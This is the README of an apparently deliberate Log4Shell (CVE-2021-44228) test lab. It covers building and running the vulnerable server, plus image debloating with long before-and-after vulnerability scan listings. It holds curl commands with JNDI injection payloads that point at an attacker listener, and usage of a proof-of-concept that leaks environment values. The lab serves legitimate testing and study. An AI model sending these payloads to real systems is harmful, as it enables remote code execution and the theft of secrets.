# log4jpwn

log4j rce test environment. See: <https://www.lunasec.io/docs/blog/log4j-zero-day/>

This repository contains an intentionally vulnerable playground to play with CVE-2021-44228 (aka: log4shell)

Experiments to trigger the vulnerability in various software products mentioned [here](https://github.com/NCSC-NL/log4shell/tree/main/software) can be found in the [vuln-software/](vuln-software/) directory.

## examples

![1](images/image.png)

using the included python poc

![2](images/poc.png)

## build

Either build the jar on your host with `mvn clean compile assembly:single`

Or use `docker` to build an image with `docker build -t log4jpwn .`

## run

The server will log 3 things (which are also the triggers). You don't have to set all 3:

- The `User-Agent` header content
- The request path
- The `pwn` query string parameter

To use:

- Run the container with `docker run --rm -p8080:8080 log4jpwn` (or the jar if you built on your host with `java -jar target/log4jpwn-1.0-SNAPSHOT-jar-with-dependencies.jar`)
- Make a `curl` request with a poisoned `User-Agent` header with your payload. eg `curl -H 'User-Agent: ${jndi:ldap://172.16.182.1:8081/a}' localhost:8080`, where 172.16.182.1 is where my netcat lister is running.

A complete example for all 3 bits that gets logged:

```bash
curl -v -H 'User-Agent: ${jndi:ldap://192.168.0.1:443/a}' 'localhost:8080/${jndi:ldap://192.168.0.1:443/a}/?pwn=$\{jndi:ldap://192.168.0.1:443/a\}'
```

## run - exploit

The python exploit will leak values. By default it will try `${java:version}`, but you can specify anything with the `--leak` flag.

Usage is:

```text
❯ ./pwn.py --help
usage: pwn.py [-h] --target TARGET [--listen-host LISTEN_HOST] [--listen-port LISTEN_PORT] --exploit-host EXPLOIT_HOST [--leak LEAK]

a simple log4j <=2.14 information disclosure poc (ref: https://twitter.com/Black2Fan/status/1470281005038817284)

optional arguments:
  -h, --help            show this help message and exit
  --target TARGET, -t TARGET
                        target uri
  --listen-host LISTEN_HOST
                        exploit server host to listen on (default: 127.0.0.1)
  --listen-port LISTEN_PORT, -lp LISTEN_PORT
                        exploit server port to listen on (default: 8888)
  --exploit-host EXPLOIT_HOST, -eh EXPLOIT_HOST
                        host where (this) exploit server is reachable
  --leak LEAK, -l LEAK  value to leak. see: https://twitter.com/Rayhan0x01/status/1469571563674505217 (default: ${java:version})
```

Example runs:

- `./pwn.py --target http://localhost:8080 --exploit-host 127.0.0.1`
- `./pwn.py --target http://localhost:8080 --exploit-host 127.0.0.1 --leak '${env:SHELL}'`
- `./pwn.py --target http://localhost:8080 --exploit-host 127.0.0.1 --listen-port 5555`


## debloat using ContainerFit

I've tweaked the `Dockerfile` to put log4j libraries in a seperate directory than the rest of the libraries. 

- To run ContainerFit, the testcase `java.sh` accesses only the 2nd java class `App2.java`, which doesn't contain logging functionality
```
./ContainerFit.sh -m=log4jpwn -t=/test/java.sh -a="-p 8080:8080"
```

- To run SBOM scan `syft <name-of-debloated-image>`

- To run vulnerability scan `grype <name-of-debloated-image>`

**Vuln Scanning results**

- Before 
```
✔ Cataloged packages      [50 packages]
✔ Scanned image           [135 vulnerabilities]
NAME                     INSTALLED                FIXED-IN                 TYPE          VULNERABILITY        SEVERITY   
jetty-client             9.4.18.v20190429                                  java-archive  CVE-2020-27223       Medium      
jetty-client             9.4.18.v20190429                                  java-archive  CVE-2022-2048        High        
jetty-client             9.4.18.v20190429                                  java-archive  CVE-2021-28169       Medium      
jetty-client             9.4.18.v20190429                                  java-archive  CVE-2020-27216       High        
jetty-client             9.4.18.v20190429                                  java-archive  CVE-2021-28165       High        
jetty-client             9.4.18.v20190429                                  java-archive  CVE-2020-27218       Medium      
jetty-client             9.4.18.v20190429                                  java-archive  CVE-2021-34428       Low         
jetty-client             9.4.18.v20190429                                  java-archive  CVE-2022-2047        Low         
jetty-http               9.4.18.v20190429                                  java-archive  CVE-2021-28165       High        
jetty-http               9.4.18.v20190429                                  java-archive  CVE-2020-27223       Medium      
jetty-http               9.4.18.v20190429         9.4.47                   java-archive  GHSA-cj7v-27pg-wf7q  Low         
jetty-http               9.4.18.v20190429                                  java-archive  CVE-2021-34428       Low         
jetty-http               9.4.18.v20190429                                  java-archive  CVE-2020-27216       High        
jetty-http               9.4.18.v20190429                                  java-archive  CVE-2020-27218       Medium      
jetty-http               9.4.18.v20190429                                  java-archive  CVE-2022-2047        Low         
jetty-http               9.4.18.v20190429                                  java-archive  CVE-2021-28169       Medium      
jetty-http               9.4.18.v20190429                                  java-archive  CVE-2022-2048        High        
jetty-io                 9.4.18.v20190429                                  java-archive  CVE-2020-27218       Medium      
jetty-io                 9.4.18.v20190429                                  java-archive  CVE-2021-28169       Medium      
jetty-io                 9.4.18.v20190429                                  java-archive  CVE-2020-27223       Medium      
jetty-io                 9.4.18.v20190429         9.4.39                   java-archive  GHSA-26vr-8j45-3r4w  High        
jetty-io                 9.4.18.v20190429                                  java-archive  CVE-2021-28165       High        
jetty-io                 9.4.18.v20190429                                  java-archive  CVE-2020-27216       High        
jetty-io                 9.4.18.v20190429                                  java-archive  CVE-2021-34428       Low         
jetty-io                 9.4.18.v20190429                                  java-archive  CVE-2022-2048        High        
jetty-io                 9.4.18.v20190429                                  java-archive  CVE-2022-2047        Low         
jetty-security           9.4.18.v20190429                                  java-archive  CVE-2022-2047        Low         
jetty-security           9.4.18.v20190429                                  java-archive  CVE-2020-27218       Medium      
jetty-security           9.4.18.v20190429                                  java-archive  CVE-2021-28165       High        
jetty-security           9.4.18.v20190429                                  java-archive  CVE-2022-2048        High        
jetty-security           9.4.18.v20190429                                  java-archive  CVE-2021-34428       Low         
jetty-security           9.4.18.v20190429                                  java-archive  CVE-2020-27216       High        
jetty-security           9.4.18.v20190429                                  java-archive  CVE-2021-28169       Medium      
jetty-security           9.4.18.v20190429                                  java-archive  CVE-2020-27223       Medium      
jetty-server             9.4.18.v20190429         9.4.37                   java-archive  GHSA-m394-8rww-3jr7  Medium      
jetty-server             9.4.18.v20190429                                  java-archive  CVE-2020-27223       Medium      
jetty-server             9.4.18.v20190429                                  java-archive  CVE-2021-28169       Medium      
jetty-server             9.4.18.v20190429                                  java-archive  CVE-2021-28165       High        
jetty-server             9.4.18.v20190429         9.4.35.v20201120         java-archive  GHSA-86wm-rrjm-8wh8  Medium      
jetty-server             9.4.18.v20190429         9.4.41                   java-archive  GHSA-m6cp-vxjx-65j6  Low         
jetty-server             9.4.18.v20190429                                  java-archive  CVE-2021-34428       Low         
jetty-server             9.4.18.v20190429                                  java-archive  CVE-2022-2047        Low         
jetty-server             9.4.18.v20190429                                  java-archive  CVE-2020-27218       Medium      
jetty-server             9.4.18.v20190429                                  java-archive  CVE-2020-27216       High        
jetty-server             9.4.18.v20190429                                  java-archive  CVE-2022-2048        High        
jetty-servlet            9.4.18.v20190429                                  java-archive  CVE-2022-2048        High        
jetty-servlet            9.4.18.v20190429                                  java-archive  CVE-2020-27223       Medium      
jetty-servlet            9.4.18.v20190429                                  java-archive  CVE-2020-27216       High        
jetty-servlet            9.4.18.v20190429                                  java-archive  CVE-2022-2047        Low         
jetty-servlet            9.4.18.v20190429                                  java-archive  CVE-2021-28169       Medium      
jetty-servlet            9.4.18.v20190429                                  java-archive  CVE-2021-28165       High        
jetty-servlet            9.4.18.v20190429                                  java-archive  CVE-2021-34428       Low         
jetty-servlet            9.4.18.v20190429                                  java-archive  CVE-2020-27218       Medium      
jetty-util               9.4.18.v20190429                                  java-archive  CVE-2020-27223       Medium      
jetty-util               9.4.18.v20190429                                  java-archive  CVE-2021-28169       Medium      
jetty-util               9.4.18.v20190429                                  java-archive  CVE-2021-28165       High        
jetty-util               9.4.18.v20190429                                  java-archive  CVE-2022-2047        Low         
jetty-util               9.4.18.v20190429                                  java-archive  CVE-2020-27218       Medium      
jetty-util               9.4.18.v20190429                                  java-archive  CVE-2020-27216       High        
jetty-util               9.4.18.v20190429                                  java-archive  CVE-2022-2048        High        
jetty-util               9.4.18.v20190429                                  java-archive  CVE-2021-34428       Low         
jetty-webapp             9.4.18.v20190429                                  java-archive  CVE-2020-27218       Medium      
jetty-webapp             9.4.18.v20190429                                  java-archive  CVE-2022-2047        Low         
jetty-webapp             9.4.18.v20190429                                  java-archive  CVE-2021-28165       High        
jetty-webapp             9.4.18.v20190429                                  java-archive  CVE-2020-27223       Medium      
jetty-webapp             9.4.18.v20190429                                  java-archive  CVE-2021-28169       Medium      
jetty-webapp             9.4.18.v20190429                                  java-archive  CVE-2022-2048        High        
jetty-webapp             9.4.18.v20190429                                  java-archive  CVE-2020-27216       High        
jetty-webapp             9.4.18.v20190429         9.4.33                   java-archive  GHSA-g3wg-6mcf-8jj6  High        
jetty-webapp             9.4.18.v20190429                                  java-archive  CVE-2021-34428       Low         
jetty-xml                9.4.18.v20190429                                  java-archive  CVE-2021-28169       Medium      
jetty-xml                9.4.18.v20190429                                  java-archive  CVE-2022-2048        High        
jetty-xml                9.4.18.v20190429                                  java-archive  CVE-2020-27216       High        
jetty-xml                9.4.18.v20190429                                  java-archive  CVE-2022-2047        Low         
jetty-xml                9.4.18.v20190429                                  java-archive  CVE-2021-28165       High        
jetty-xml                9.4.18.v20190429                                  java-archive  CVE-2020-27223       Medium      
jetty-xml                9.4.18.v20190429                                  java-archive  CVE-2020-27218       Medium      
jetty-xml                9.4.18.v20190429                                  java-archive  CVE-2021-34428       Low         
junit                    4.11                     4.13.1                   java-archive  GHSA-269g-pwp5-87pp  Medium      
libc6                    2.31-13+deb11u3                                   deb           CVE-2019-9192        Negligible  
libc6                    2.31-13+deb11u3                                   deb           CVE-2019-1010025     Negligible  
libc6                    2.31-13+deb11u3          2.31-13+deb11u4          deb           CVE-2021-3999        High        
libc6                    2.31-13+deb11u3                                   deb           CVE-2019-1010022     Negligible  
libc6                    2.31-13+deb11u3                                   deb           CVE-2018-20796       Negligible  
libc6                    2.31-13+deb11u3                                   deb           CVE-2019-1010023     Negligible  
libc6                    2.31-13+deb11u3                                   deb           CVE-2010-4756        Negligible  
libc6                    2.31-13+deb11u3                                   deb           CVE-2019-1010024     Negligible  
libexpat1                2.2.10-2+deb11u3                                  deb           CVE-2013-0340        Negligible  
libexpat1                2.2.10-2+deb11u3         2.2.10-2+deb11u4         deb           CVE-2022-40674       Critical    
libfreetype6             2.10.4+dfsg-1            2.10.4+dfsg-1+deb11u1    deb           CVE-2022-27404       Critical    
libfreetype6             2.10.4+dfsg-1            2.10.4+dfsg-1+deb11u1    deb           CVE-2022-27405       High        
libfreetype6             2.10.4+dfsg-1            2.10.4+dfsg-1+deb11u1    deb           CVE-2022-27406       High        
libfreetype6             2.10.4+dfsg-1                                     deb           CVE-2022-31782       Negligible  
libglib2.0-0             2.66.8-1                                          deb           CVE-2012-0039        Negligible  
libharfbuzz0b            2.7.4-1                  (won't fix)              deb           CVE-2022-33068       Medium      
libjpeg62-turbo          1:2.0.6-4                (won't fix)              deb           CVE-2021-46822       Medium      
libpcre3                 2:8.39-13                                         deb           CVE-2017-16231       Negligible  
libpcre3                 2:8.39-13                                         deb           CVE-2017-7245        Negligible  
libpcre3                 2:8.39-13                                         deb           CVE-2019-20838       Negligible  
libpcre3                 2:8.39-13                                         deb           CVE-2017-11164       Negligible  
libpcre3                 2:8.39-13                                         deb           CVE-2017-7246        Negligible  
libpng16-16              1.6.37-3                                          deb           CVE-2021-4214        Negligible  
libpng16-16              1.6.37-3                                          deb           CVE-2019-6129        Negligible  
libssl1.1                1.1.1n-0+deb11u1         (won't fix)              deb           CVE-2022-2097        Medium      
libssl1.1                1.1.1n-0+deb11u1                                  deb           CVE-2007-6755        Negligible  
libssl1.1                1.1.1n-0+deb11u1         1.1.1n-0+deb11u2         deb           CVE-2022-1292        Critical    
libssl1.1                1.1.1n-0+deb11u1                                  deb           CVE-2010-0928        Negligible  
libssl1.1                1.1.1n-0+deb11u1         1.1.1n-0+deb11u3         deb           CVE-2022-2068        Critical    
libuuid1                 2.36.1-8+deb11u1                                  deb           CVE-2022-0563        Negligible  
log4j-api                2.14.0                                            java-archive  CVE-2021-45105       Medium      
log4j-api                2.14.0                                            java-archive  CVE-2021-44832       Medium      
log4j-core               2.14.0                                            java-archive  CVE-2021-44832       Medium      
log4j-core               2.14.0                   2.15.0                   java-archive  GHSA-jfh8-c2jp-5v3q  Critical    
log4j-core               2.14.0                   2.16.0                   java-archive  GHSA-7rjr-3q55-vv33  Critical    
log4j-core               2.14.0                                            java-archive  CVE-2021-45105       Medium      
log4j-core               2.14.0                                            java-archive  CVE-2021-44228       Critical    
log4j-core               2.14.0                   2.17.0                   java-archive  GHSA-p6xc-xr62-6r2g  High        
log4j-core               2.14.0                                            java-archive  CVE-2021-45046       Critical    
log4j-core               2.14.0                   2.17.1                   java-archive  GHSA-8489-44mv-ggj8  Medium      
openjdk-11-jre-headless  11.0.14+9-1~deb11u1      11.0.15+10-1~deb11u1     deb           CVE-2022-21443       Low         
openjdk-11-jre-headless  11.0.14+9-1~deb11u1      11.0.16+8-1~deb11u1      deb           CVE-2022-21540       Medium      
openjdk-11-jre-headless  11.0.14+9-1~deb11u1      11.0.15+10-1~deb11u1     deb           CVE-2022-21496       Medium      
openjdk-11-jre-headless  11.0.14+9-1~deb11u1      11.0.15+10-1~deb11u1     deb           CVE-2022-21476       High        
openjdk-11-jre-headless  11.0.14+9-1~deb11u1      11.0.15+10-1~deb11u1     deb           CVE-2022-21426       Medium      
openjdk-11-jre-headless  11.0.14+9-1~deb11u1      11.0.16+8-1~deb11u1      deb           CVE-2022-34169       High        
openjdk-11-jre-headless  11.0.14+9-1~deb11u1      11.0.15+10-1~deb11u1     deb           CVE-2022-21434       Medium      
openjdk-11-jre-headless  11.0.14+9-1~deb11u1      11.0.16+8-1~deb11u1      deb           CVE-2022-21541       Medium      
openssl                  1.1.1n-0+deb11u1                                  deb           CVE-2007-6755        Negligible  
openssl                  1.1.1n-0+deb11u1         (won't fix)              deb           CVE-2022-2097        Medium      
openssl                  1.1.1n-0+deb11u1         1.1.1n-0+deb11u2         deb           CVE-2022-1292        Critical    
openssl                  1.1.1n-0+deb11u1         1.1.1n-0+deb11u3         deb           CVE-2022-2068        Critical    
openssl                  1.1.1n-0+deb11u1                                  deb           CVE-2010-0928        Negligible  
zlib1g                   1:1.2.11.dfsg-2+deb11u1  1:1.2.11.dfsg-2+deb11u2  deb           CVE-2022-37434       Critical    
moh@FitDocker:~$ docker images
REPOSITORY                     TAG       IMAGE ID       CREATED        SIZE
d_log4jpwn_fe5862fa_bin_java   latest    3c3b04ee2e39   2 hours ago    173MB
log4jpwn                       latest    e0e54ae02548   2 hours ago    215MB
<none>                         <none>    1d5dee264678   2 hours ago    573MB
<none>                         <none>    a9cb6afeb0fc   2 hours ago    571MB
<none>                         <none>    01524eb8b02b   3 hours ago    571MB
<none>                         <none>    0fc063b58ec4   3 hours ago    571MB
<none>                         <none>    dc679c42f6af   4 hours ago    215MB
<none>                         <none>    4495a1072cb8   4 hours ago    571MB
<none>                         <none>    793c5e39032c   4 hours ago    215MB
<none>                         <none>    82ec2df63eb1   4 hours ago    215MB
<none>                         <none>    fc46e43d33c5   6 hours ago    215MB
maven                          latest    eee42bfd68d5   8 days ago     535MB
gcr.io/distroless/java         11        4c4b3da468da   52 years ago   210MB 
```

- After 
```
 ✔ Cataloged packages      [21 packages]
 ✔ Scanned image           [79 vulnerabilities]
NAME            INSTALLED         FIXED-IN          TYPE          VULNERABILITY        SEVERITY 
jetty-client    9.4.18.v20190429                    java-archive  CVE-2020-27218       Medium    
jetty-client    9.4.18.v20190429                    java-archive  CVE-2020-27223       Medium    
jetty-client    9.4.18.v20190429                    java-archive  CVE-2021-34428       Low       
jetty-client    9.4.18.v20190429                    java-archive  CVE-2021-28169       Medium    
jetty-client    9.4.18.v20190429                    java-archive  CVE-2022-2048        High      
jetty-client    9.4.18.v20190429                    java-archive  CVE-2020-27216       High      
jetty-client    9.4.18.v20190429                    java-archive  CVE-2022-2047        Low       
jetty-client    9.4.18.v20190429                    java-archive  CVE-2021-28165       High      
jetty-http      9.4.18.v20190429                    java-archive  CVE-2021-28169       Medium    
jetty-http      9.4.18.v20190429                    java-archive  CVE-2021-34428       Low       
jetty-http      9.4.18.v20190429                    java-archive  CVE-2022-2048        High      
jetty-http      9.4.18.v20190429                    java-archive  CVE-2022-2047        Low       
jetty-http      9.4.18.v20190429                    java-archive  CVE-2020-27216       High      
jetty-http      9.4.18.v20190429                    java-archive  CVE-2021-28165       High      
jetty-http      9.4.18.v20190429                    java-archive  CVE-2020-27218       Medium    
jetty-http      9.4.18.v20190429                    java-archive  CVE-2020-27223       Medium    
jetty-http      9.4.18.v20190429  9.4.47            java-archive  GHSA-cj7v-27pg-wf7q  Low       
jetty-io        9.4.18.v20190429                    java-archive  CVE-2021-28169       Medium    
jetty-io        9.4.18.v20190429                    java-archive  CVE-2020-27218       Medium    
jetty-io        9.4.18.v20190429                    java-archive  CVE-2021-34428       Low       
jetty-io        9.4.18.v20190429                    java-archive  CVE-2020-27216       High      
jetty-io        9.4.18.v20190429                    java-archive  CVE-2022-2048        High      
jetty-io        9.4.18.v20190429                    java-archive  CVE-2020-27223       Medium    
jetty-io        9.4.18.v20190429  9.4.39            java-archive  GHSA-26vr-8j45-3r4w  High      
jetty-io        9.4.18.v20190429                    java-archive  CVE-2022-2047        Low       
jetty-io        9.4.18.v20190429                    java-archive  CVE-2021-28165       High      
jetty-security  9.4.18.v20190429                    java-archive  CVE-2022-2048        High      
jetty-security  9.4.18.v20190429                    java-archive  CVE-2022-2047        Low       
jetty-security  9.4.18.v20190429                    java-archive  CVE-2020-27223       Medium    
jetty-security  9.4.18.v20190429                    java-archive  CVE-2020-27218       Medium    
jetty-security  9.4.18.v20190429                    java-archive  CVE-2021-28169       Medium    
jetty-security  9.4.18.v20190429                    java-archive  CVE-2020-27216       High      
jetty-security  9.4.18.v20190429                    java-archive  CVE-2021-28165       High      
jetty-security  9.4.18.v20190429                    java-archive  CVE-2021-34428       Low       
jetty-server    9.4.18.v20190429                    java-archive  CVE-2022-2048        High      
jetty-server    9.4.18.v20190429                    java-archive  CVE-2021-34428       Low       
jetty-server    9.4.18.v20190429  9.4.37            java-archive  GHSA-m394-8rww-3jr7  Medium    
jetty-server    9.4.18.v20190429                    java-archive  CVE-2021-28165       High      
jetty-server    9.4.18.v20190429  9.4.35.v20201120  java-archive  GHSA-86wm-rrjm-8wh8  Medium    
jetty-server    9.4.18.v20190429  9.4.41            java-archive  GHSA-m6cp-vxjx-65j6  Low       
jetty-server    9.4.18.v20190429                    java-archive  CVE-2020-27223       Medium    
jetty-server    9.4.18.v20190429                    java-archive  CVE-2021-28169       Medium    
jetty-server    9.4.18.v20190429                    java-archive  CVE-2020-27216       High      
jetty-server    9.4.18.v20190429                    java-archive  CVE-2020-27218       Medium    
jetty-server    9.4.18.v20190429                    java-archive  CVE-2022-2047        Low       
jetty-servlet   9.4.18.v20190429                    java-archive  CVE-2021-28165       High      
jetty-servlet   9.4.18.v20190429                    java-archive  CVE-2021-34428       Low       
jetty-servlet   9.4.18.v20190429                    java-archive  CVE-2020-27218       Medium    
jetty-servlet   9.4.18.v20190429                    java-archive  CVE-2020-27223       Medium    
jetty-servlet   9.4.18.v20190429                    java-archive  CVE-2020-27216       High      
jetty-servlet   9.4.18.v20190429                    java-archive  CVE-2021-28169       Medium    
jetty-servlet   9.4.18.v20190429                    java-archive  CVE-2022-2047        Low       
jetty-servlet   9.4.18.v20190429                    java-archive  CVE-2022-2048        High      
jetty-util      9.4.18.v20190429                    java-archive  CVE-2022-2048        High      
jetty-util      9.4.18.v20190429                    java-archive  CVE-2021-28165       High      
jetty-util      9.4.18.v20190429                    java-archive  CVE-2021-34428       Low       
jetty-util      9.4.18.v20190429                    java-archive  CVE-2020-27223       Medium    
jetty-util      9.4.18.v20190429                    java-archive  CVE-2022-2047        Low       
jetty-util      9.4.18.v20190429                    java-archive  CVE-2020-27218       Medium    
jetty-util      9.4.18.v20190429                    java-archive  CVE-2020-27216       High      
jetty-util      9.4.18.v20190429                    java-archive  CVE-2021-28169       Medium    
jetty-webapp    9.4.18.v20190429                    java-archive  CVE-2022-2048        High      
jetty-webapp    9.4.18.v20190429                    java-archive  CVE-2020-27216       High      
jetty-webapp    9.4.18.v20190429                    java-archive  CVE-2021-28165       High      
jetty-webapp    9.4.18.v20190429                    java-archive  CVE-2020-27218       Medium    
jetty-webapp    9.4.18.v20190429                    java-archive  CVE-2020-27223       Medium    
jetty-webapp    9.4.18.v20190429                    java-archive  CVE-2021-28169       Medium    
jetty-webapp    9.4.18.v20190429  9.4.33            java-archive  GHSA-g3wg-6mcf-8jj6  High      
jetty-webapp    9.4.18.v20190429                    java-archive  CVE-2022-2047        Low       
jetty-webapp    9.4.18.v20190429                    java-archive  CVE-2021-34428       Low       
jetty-xml       9.4.18.v20190429                    java-archive  CVE-2022-2048        High      
jetty-xml       9.4.18.v20190429                    java-archive  CVE-2020-27223       Medium    
jetty-xml       9.4.18.v20190429                    java-archive  CVE-2020-27216       High      
jetty-xml       9.4.18.v20190429                    java-archive  CVE-2020-27218       Medium    
jetty-xml       9.4.18.v20190429                    java-archive  CVE-2022-2047        Low       
jetty-xml       9.4.18.v20190429                    java-archive  CVE-2021-34428       Low       
jetty-xml       9.4.18.v20190429                    java-archive  CVE-2021-28169       Medium    
jetty-xml       9.4.18.v20190429                    java-archive  CVE-2021-28165       High      
junit           4.11              4.13.1            java-archive  GHSA-269g-pwp5-87pp  Medium
```
